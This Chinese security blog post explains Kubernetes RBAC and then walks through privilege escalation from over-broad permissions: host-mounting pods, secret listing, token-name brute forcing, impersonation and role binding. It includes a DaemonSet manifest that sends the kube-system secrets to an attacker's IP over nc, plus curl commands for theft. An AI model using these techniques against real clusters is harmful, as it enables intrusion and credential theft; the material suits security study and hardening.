在K8s中RBAC是常用的授权模式，如果在配置RBAC时分配了“过大”资源对象访问权限可导致权限滥用来提权，以至于攻击者扩大战果，渗透集群。

如下是一些RBAC相关的笔记。

# k8s的RBAC

`RBAC`\- 基于角色的访问控制。

`RBAC`使用`rbac.authorization.k8s.io`API Group 来实现授权决策，允许管理员通过 Kubernetes API
动态配置策略，要启用`RBAC`，需要在 apiserver 中添加参数`--authorization-mode=RBAC`，如果使用的`kubeadm`安装的集群，1.6 版本以上的都默认开启了`RBAC`:  
`cat /etc/kubernetes/manifests/kube-apiserver.yaml | grep "authorization-mode"`  
![1655368658-293387-image](https://image.3001.net/images/20220621/1655784943_62b145ef3a957c53580bf.png!small)

## RBAC相关对象

K8s所有的资源对象都是模型化的API对象，允许执行CRUD，RBAC也有相关API对象，像Role、ClusterRole对象都是K8s内部的 API
资源，可以使用`kubectl`相关的命令来进行操作：

  * `Role`和`ClusterRole`：角色和集群角色，这两个对象都包含上面的 Rules 元素，二者的区别在于，在 Role 中，定义的规则只适用于单个命名空间，也就是和 namespace 关联的，而 ClusterRole 是集群范围内的，因此定义的规则不受命名空间的约束。

  * `RoleBinding`和`ClusterRoleBinding`：角色绑定和集群角色绑定，简单来说就是把声明的 Subject 和我们的 Role 进行绑定的过程(给某个用户绑定上操作的权限)，二者的区别也是作用范围的区别：RoleBinding 只会影响到当前 namespace 下面的资源操作权限，而 ClusterRoleBinding 会影响到所有的 namespace。

举一些RBAC使用的例子。

## 创建一个只能访问固定namespace的的`hx`用户

### 1.新创建一个用户凭证

给hx用户创建一个私钥：

`openssl genrsa -out hx.key 2048`

再使用这个私钥创建一个`证书签名请求文件`,`-subj`参数后是用户名和组(CN表示用户名，O表示组)：

`openssl req -new -key hx.key -out hx.csr -subj "/CN=hx/O=huoxian"`

然后再使用K8s的CA证书来批准上面的证书请求：  
![1655368756-280293-image](https://image.3001.net/images/20220621/1655784943_62b145ef9850c86e27925.png!small)  
这时候证书文件生成成功：

    
    
    $ ls h*                                                                                                              ─╯
    hx.crt  hx.csr  hx.key
    

现在使用创建的证书和私钥来在集群中创建新的凭证和上下文(Context):

`sudo kubectl config set-credentials hx --client-certificate=hx.crt --client-key=hx.key`  
![1655368774-478239-image](https://image.3001.net/images/20220621/1655784944_62b145f08f2b845098e91.png!small)  
为hx用户设置新的 Context:

    
    
    $ sudo kubectl config set-context hx-context --cluster=kubernetes --namespace=kube-system --user=hx                  ─╯
    Context "hx-context" created.
    
    
    
    apiVersion: rbac.authorization.k8s.io/v1
    kind: Role
    metadata:
      name: hx-role
      namespace: kube-system
    rules:
    - apiGroups: ["", "extensions", "apps"]
      resources: ["deployments", "replicasets", "pods"]
      verbs: ["get", "list", "watch", "create", "update", "patch", "delete"] # 也可以使用['*']
    

其中几个重要的字段：

  * `apiGroups`：其中的`apiGroups: ["", "extensions", "apps"]`为什么这么写？是因为通过<https://kubernetes.io/docs/reference/generated/kubernetes-api/v1.10/>文档查询得知，`Pod`属于 core API Group(为空即可)，`Deployment`属于 apps API Group，`ReplicaSets`属于`extensions`API Group。

  * `verbs`:可以对这些资源对象执行的操作,如果是所有操作就用*代替。

创建hx-role这个Role：  
![1655368799-776330-image](https://image.3001.net/images/20220621/1655784945_62b145f10247c1781efd9.png!small)

### 2.创建角色权限绑定

将hx用户和这个role绑定起来：

    
    
    apiVersion: rbac.authorization.k8s.io/v1
    kind: RoleBinding
    metadata:
      name: hx-rolebinding
      namespace: kube-system
    subjects:
    - kind: User
      name: hx
      apiGroup: ""
    roleRef:
      kind: Role
      name: hx-role
      apiGroup: ""
    

![1655369676-913803-image](https://image.3001.net/images/20220621/1655784945_62b145f15e8f55dd89266.png!small)

`Subject`字段是主题，对应在集群中尝试操作的对象，集群中定义了3种类型的主题资源：

  * User Account：用户，这是有外部独立服务进行管理的，管理员进行私钥的分配，用户可以使用 KeyStone或者 Goolge 帐号，甚至一个用户名和密码的文件列表也可以。对于用户的管理集群内部没有一个关联的资源对象，所以用户不能通过集群内部的 API 来进行管理

  * Group：组，这是用来关联多个账户的，集群中有一些默认创建的组，比如cluster-admin

  * Service Account：服务帐号，通过`Kubernetes`API 来管理的一些用户帐号，和 namespace 进行关联的，适用于集群内部运行的应用程序，需要通过 API 来完成权限认证，所以在集群内部进行权限操作，我们都需要使用到 ServiceAccount，这也是我们这节课的重点

现在使用hx用户来操作集群资源,这个时候不需要指定`namespace`，因为已经给用户分配了权限：

`sudo kubectl get pods --context=hx-context`

![1655369689-712432-image](https://image.3001.net/images/20220621/1655784945_62b145f1ce01adfd1483e.png!small)

## 创建一个只能访问固定namespace的的`hx-sa`的ServiceAccount

`Subject`字段还可以是ServiceAccount，对ServiceAccount来进行角色绑定。

### 1.创建一个ServiceAccount对象

`sudo kubectl create sa hx-sa -n kube-system`

### 2.创建角色

    
    
    apiVersion: rbac.authorization.k8s.io/v1
    kind: Role
    metadata:
      name: hx-sa-role
      namespace: kube-system
    rules:
    - apiGroups: [""]
      resources: ["pods"]
      verbs: ["get", "watch", "list"]
    - apiGroups: ["apps"]
      resources: ["deployments"]
      verbs: ["get", "list", "watch", "create", "update", "patch", "delete"]
    

![1655369785-171569-image](https://image.3001.net/images/20220621/1655784947_62b145f346ad36844b2e1.png!small)

### 3.创建角色绑定

    
    
    kind: RoleBinding
    apiVersion: rbac.authorization.k8s.io/v1
    metadata:
      name: hx-sa-rolebinding
      namespace: kube-system
    subjects:
    - kind: ServiceAccount
      name: hx-sa
      namespace: kube-system
    roleRef:
      kind: Role
      name: hx-sa-role
      apiGroup: rbac.authorization.k8s.io
    

![1655369801-701896-image](https://image.3001.net/images/20220621/1655784947_62b145f3b3697098b35f5.png!small)

这时候可以使用sa账户的token去访问apiserver的资源了：

    
    
    sudo kubectl get secret -n kube-system |grep hx-sa
    sudo kubectl get secret hx-sa-token-bkrlc -o jsonpath={.data.token} -n kube-system |base64 -d
    

![1655369817-921180-image](https://image.3001.net/images/20220621/1655784948_62b145f43991352f9f7be.png!small)

## 创建ClusterRoleBinding

如果需要创建一个可以访问所有namespace的角色，就可以使用ClusterRole 和 ClusterRoleBinding 这两种资源对象了。

sa：

    
    
    apiVersion: v1
    kind: ServiceAccount
    metadata:
      name: hx-sa2
      namespace: kube-system
    

ClusterRoleBinding 对象:

    
    
    kind: ClusterRoleBinding
    apiVersion: rbac.authorization.k8s.io/v1beta1
    metadata:
      name: hx-sa2-clusterrolebinding
    subjects:
    - kind: ServiceAccount
      name: hx-sa2
      namespace: kube-system
    roleRef:
      kind: ClusterRole
      name: cluster-admin
      apiGroup: rbac.authorization.k8s.io
    

这里是直接使用的cluster-admin 这个对象（`Kubernetes`集群内置的 ClusterRole
对象）而不是单独新建的ClusterRole对象。内置的集群角色和集群角色绑定都可以查看

    
    
    kubectl get clusterrole
    kubectl get clusterrolebinding
    

![1655369837-205098-image](https://image.3001.net/images/20220621/1655784949_62b145f5dcaa445fa9e64.png!small)

# RBAC权限滥用提权

权限滥用主要在对特定资源有特定操作的情况下，可以有特定的权限提升。  
对哪里资源有哪些操作权限通过上面已经说了，看rules的字段内容即可，配置`resources`和`verbs`都为*那不用说，所有资源都可以进行任意操作。  
![1655370048-491869-image](https://image.3001.net/images/20220621/1655784951_62b145f76daa77e0615b5.png!small)

## 枚举当前RBAC权限

在指定当前通过渗透得到用户凭据或者sa的凭据后，可以先枚举当前有哪些权限：![](https://image.3001.net/images/20220627/1656323784_62b97ec835d74a7cd6fe9.png!small)

![1655372400-914302-image](https://image.3001.net/images/20220621/1655784951_62b145f7ad75524bfcd63.png!small)

也可以使用curl对apiserver的api进行访问来区别当前的权限:  
![1655371873-47175-image](https://image.3001.net/images/20220621/1655784952_62b145f83c0dd4514f007.png!small)

枚举之后应该对当前凭据对资源的操作有个数了，下面列举在分配权限时，哪些情况下有提权提升的可能。

## create pods权限

`resources: ["*"] verbs:
["create"]`：`resources`为*或者为`pods`的情况下，verbs是`create`，在集群中可以创建任意资源，比如像pods，roles.而创建pods的命名空间也取决你role中metadata.namespace的值：  
![1655370509-489699-image](https://image.3001.net/images/20220621/1655784952_62b145f8a59e4d2212f5b.png!small)

如果有create权限，常见攻击手法就是创建挂载根目录的pod，跳到node：  
![1655372021-455993-image](https://image.3001.net/images/20220621/1655784953_62b145f91620cdff0b114.png!small)

## list secrets权限

`resources: ["*"] verbs:
["list"]`：`resources`为*或者为`secrets`的情况下，verbs是`list`,在集群中可以列出其他user的secrets，一般拿来寻找特权账号凭据。

具有list权限或者说是list secrets权限的role可以列出集群中重要的secrets，包括管理的keys(JWT):  
![1655370645-704606-image](https://image.3001.net/images/20220621/1655784953_62b145f96ef7b3d298273.png!small)

利用：  
`curl -v -H "Authorization: Bearer <jwt_token>"
https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/`

## get secret权限

`resources: ["*"] verbs:
["get"]`:`resources`为*或者为`secrets`的情况下，verbs是`get`，get可以在集群中获得其他service
accounts的secrets。

如下定义Role的resources字段为*或者secrets对象，并且verbs为get，这时候有权限获得其他secrets。  
![1655370732-343714-image](https://image.3001.net/images/20220621/1655784953_62b145f9dc9b3bb1d2a8b.png!small)  
get权限能访问的api：

    
    
    GET /apis/apps/v1/namespaces/{namespace}/deployments/{name}
    

但是get和list不一样，get需要知道secrets的id才能读：  
![1655370753-639383-image](https://image.3001.net/images/20220621/1655784954_62b145fa74564a38d3333.png!small)  
图出处：list和get来窃取凭据的区别：<https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/18100/2020_USA20_DSO-W01_01_Compromising%20Kubernetes%20Cluster%20by%20Exploiting%20RBAC%20Permissions.pdf>

这时候用读secrets来攻击的话常见手法是读默认的sa的token,默认有这些sa:  
![1655370867-76480-image](https://image.3001.net/images/20220621/1655784954_62b145fad1a297ddb915a.png!small)  
对应的token:

    
    
    kubectl -n kube-system get secret -n kube-system
    

![1655370890-300354-image](https://image.3001.net/images/20220621/1655784955_62b145fba733cc4fb766b.png!small)  
可以看到每个sa的token都是sa的`name-token-随机五个字符`,

其中随机的字符是由数字和字母组合，特定的27个字符：

https://github.com/kubernetes/kubernetes/blob/8418cccaf6a7307479f1dfeafb0d2823c1c37802/staging/src/k8s.io/apimachinery/pkg/util/rand/rand.go#183：#  
![1655370903-971151-image](https://image.3001.net/images/20220621/1655784958_62b145feac73704660949.png!small)  
27的5次方也是14,348,907可能，写个py脚本的迭代器爆破即可：  
![1655370950-280471-image](https://image.3001.net/images/20220621/1655784959_62b145ff290dba2634435.png!small)

## get list watch secrets权限

`resources: ["*"] verbs:
["get","list","watch"]`:resources字段为*或者secrets的话可以利用这三个权限，来创建一个恶意pod后通过挂载secrets以至获取别人的secrets，然后外带：

![1655371003-703490-image](https://image.3001.net/images/20220621/1655784963_62b1460338194719ecf1b.png!small)

![1655371029-29189-image](https://image.3001.net/images/20220621/1655784995_62b146236316e1b2ef805.png!small)

这里使用`automountServiceAccountToken`将特权服务帐户的令牌挂载到
pod，使用令牌获取拿到所有secrets后用nc传到攻击者监听端口，当前也可以使用其他方式带外：  
![1655371040-16623-image](https://image.3001.net/images/20220621/1655784995_62b14623ae0e534d9ad2d.png!small)  
图出处，创建一个"hot pod"来窃取凭据：<https://published-prd.lanyonevents.com/published/rsaus20/sessionsFiles/18100/2020_USA20_DSO-W01_01_Compromising%20Kubernetes%20Cluster%20by%20Exploiting%20RBAC%20Permissions.pdf>

## Impersonate权限

用户可以通过模拟标头充当另一个用户。这些让请求手动覆盖请求身份验证的用户信息。例如，管理员可以使用此功能通过临时模拟另一个用户并查看请求是否被拒绝来调试授权策略。

以下 HTTP 标头可用于执行模拟请求：

  * `Impersonate-User`：要充当的用户名。

  * `Impersonate-Group`：要充当的组名。可以多次提供设置多个组。可选的。需要“模拟用户”。

  * `Impersonate-Extra-( extra name )`：用于将额外字段与用户关联的动态标题。可选的。需要“模拟用户”。

  * `Impersonate-Uid`：代表被模拟用户的唯一标识符。可选的。需要“模拟用户”。Kubernetes 对此字符串没有任何格式要求。

有了`Impersonate`权限攻击者可以模拟一个有特权的账户或者组：  
Role:  
![1655371467-38911-image](https://image.3001.net/images/20220621/1655784996_62b146245311da14e6ba8.png!small)

binding:

![1655371484-244657-image](https://image.3001.net/images/20220621/1655784996_62b14624e226c88b8e784.png!small)

模拟用户的操作是通过调用K8s API 的Header来指定的，kubectl可以加入--as参数：

    
    
    kubectl --as <user-to-impersonate> ...
    kubectl --as <user-to-impersonate> --as-group <group-to-impersonate> ...
    

请求apiserver:

    
    
    curl -k -v -XGET -H "Authorization: Bearer <JWT TOKEN (of the impersonator)>" \
    -H "Impersonate-Group: system:masters"\ 
    -H "Impersonate-User: null" \
    -H "Accept: application/json" \
    https://<master_ip>:<port>/api/v1/namespaces/kube-system/secrets/
    

## 其他API资源对象的create权限滥用

如果当前Role的权限，是其他API对象的创建，比如`Deployment, Daemonsets, Statefulsets,
Replicationcontrollers, Replicasets,
Jobs，Cronjobs`等，都是可以进行创建然后在containers.args字段加入执行的e恶意命令：

    
    
    apiVersion: apps/v1
    kind: DaemonSet
    metadata:
      name: alpine
      namespace: kube-system
    spec:
      selector:
        matchLabels:
          name: alpine
      template:
        metadata:
          labels:
            name: alpine
        spec:
          serviceAccountName: bootstrap-signer
          automountServiceAccountToken: true
          hostNetwork: true
          containers:
          - name: alpine
            image: alpine
            command: ["/bin/sh"]
            args: ["-c", 'apk update && apk add curl --no-cache; cat /run/secrets/kubernetes.io/serviceaccount/token | { read TOKEN; curl -k -v -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" https://192.168.154.228:8443/api/v1/namespaces/kube-system/secrets; } | nc -nv 192.168.154.228 6666; sleep 100000']
    

其他创建pod的方法具体可以查看pod-templates：<https://kubernetes.io/docs/concepts/workloads/pods/pod-overview/#pod-templates>

## Bind权限

用有`bind`权限 **允许用户将高角色绑定到当前已经被控制的帐户** 导致权限提权。

下面的ClusterRole使用了bind权限，允许用户创建一个与管理ClusterRole(默认的高特权角色)的RoleBinding，并添加任何用户，包括自己，到这个管理ClusterRole：  
![1655372141-119401-image](https://image.3001.net/images/20220621/1655784997_62b14625a1591c2e4aebb.png!small)

 **那么就有可能创造出恶意角色binging** ，它将管理员角色绑定到现在已经被控制的帐户:  
![1655372177-891382-image](https://image.3001.net/images/20220621/1655784998_62b1462648814a42022e3.png!small)

使用kubectl指定token或者curl到apiserver来完成绑定：

    
    
    curl -k -v -X POST -H "Authorization: Bearer <JWT TOKEN>" \ 
    -H "Content-Type: application/json" \
    https://<master_ip>:<port>/apis/rbac.authorization.k8s.io/v1/namespaces/default/rolebindings \
     -d @malicious-RoleBinging.json
    

然后当前账户就是高权限角色，自然可以列出secret等：

    
    
    curl -k -v -X POST -H "Authorization: Bearer <COMPROMISED JWT TOKEN>"\   
    -H "Content-Type: application/json" https://<master_ip>:<port>/api/v1/namespaces/kube-system/secret

 **作者：今天R了吗**

